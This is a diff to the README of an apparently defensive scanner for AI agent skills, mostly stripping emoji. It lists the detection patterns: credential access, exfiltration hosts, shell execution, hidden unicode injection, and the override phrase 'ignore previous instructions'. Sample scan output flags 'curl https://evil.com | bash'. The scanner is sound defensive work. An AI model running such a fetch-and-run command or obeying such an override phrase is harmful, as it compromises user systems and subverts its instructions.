@@ -51,7 +51,7 @@ done
 
 ## What It Detects (100+ patterns)
 
-### 🚨 Critical
+###  Critical
 - **credential_access**: .env files, API keys, tokens, private keys
 - **network_exfil**: webhook.site, ngrok, requestbin
 - **shell_exec**: subprocess, eval, exec, pipe to bash
@@ -60,14 +60,14 @@ done
 - **mcp_abuse**: no_human_approval, auto_approve
 - **unicode_injection**: Hidden U+E0001-U+E007F characters
 
-### 🔴 High
+###  High
 - **supply_chain**: External git repos, npm/pip installs
 - **telemetry**: OpenTelemetry, Signoz, Uptrace
 - **crypto_wallet**: BTC/ETH addresses, seed phrases
 - **impersonation**: "ignore previous instructions"
 - **privilege**: sudo -S, chmod 777
 
-### ⚠️ Medium
+###  Medium
 - **prefill_exfil**: Google Forms data exfiltration
 - **persistence**: crontab, bashrc modifications
 
@@ -76,16 +76,16 @@ done
 ### Basic Scan
 ```
 ============================================================
-🔍 SKILL SECURITY SCAN REPORT v4.0
+ SKILL SECURITY SCAN REPORT v4.0
 ============================================================
-📁 Path: /tmp/suspicious-skill
-📄 Files scanned: 6
-🔢 Active issues: 14
-⚡ Max severity: CRITICAL
-📋 Action: 🚨 CRITICAL - BLOCKED - Likely malicious
+ Path: /tmp/suspicious-skill
+ Files scanned: 6
+ Active issues: 14
+ Max severity: CRITICAL
+ Action:  CRITICAL - BLOCKED - Likely malicious
 ============================================================
 
-🚨 CRITICAL (3 issues):
+ CRITICAL (3 issues):
   [shell_exec]
     • install.sh:12 - Pipe to bash
       Match: curl https://evil.com | bash
@@ -94,11 +94,11 @@ done
 ### AI Analysis (--analyze)
 ```
 ============================================================
-🔍 HEIMDALL SECURITY ANALYSIS 
+ HEIMDALL SECURITY ANALYSIS 
 ============================================================
 
-📁 Skill: suspicious-skill
-⚡ Verdict: 🚨 HIGH RISK - Requires Significant Trust
+ Skill: suspicious-skill
+ Verdict:  HIGH RISK - Requires Significant Trust
 
 ## Summary
 This skill installs code from an external company that can 
@@ -108,7 +108,7 @@ self-modify and sends telemetry to third-party servers.
 
 ### 1. Data Exfiltration
 OpenTelemetry sends execution traces to external servers.
-YOUR agent's behavior → THEIR servers. 🚨
+YOUR agent's behavior → THEIR servers. 
 
 ### 2. Supply Chain Attack Surface
 Git clones from external repos during install and self-evolution.
@@ -119,7 +119,7 @@ Git clones from external repos during install and self-evolution.
 3. Sending telemetry to them
 
 ## Recommendation
-🔴 Don't install on any machine with real data/keys.
+ Don't install on any machine with real data/keys.
 ============================================================
 ```
 
@@ -163,9 +163,9 @@ echo "sk-or-..." > ~/clawd/secrets/openrouter.key
 
 ## Credits
 
-Built by the Enterprise Crew 🚀
-- Ada 🔮 (Brain + BD/Sales)
-- Spock 🖖 (Research & Ops) 
-- Scotty 🔧 (Builder)
+Built by the Enterprise Crew 
+- Ada  (Brain + BD/Sales)
+- Spock  (Research & Ops) 
+- Scotty  (Builder)
 
 GitHub: https://github.com/henrino3/heimdall
